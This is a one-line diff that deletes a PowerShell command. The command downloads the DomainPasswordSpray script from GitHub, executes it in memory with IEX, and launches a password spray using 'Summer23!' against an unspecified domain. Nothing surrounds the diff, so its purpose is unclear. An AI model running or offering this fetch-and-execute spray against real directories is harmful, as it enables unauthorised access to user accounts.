@@ -1,1 +1,0 @@
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1'); Invoke-DomainPasswordSpray -Password Summer23! -Domain 
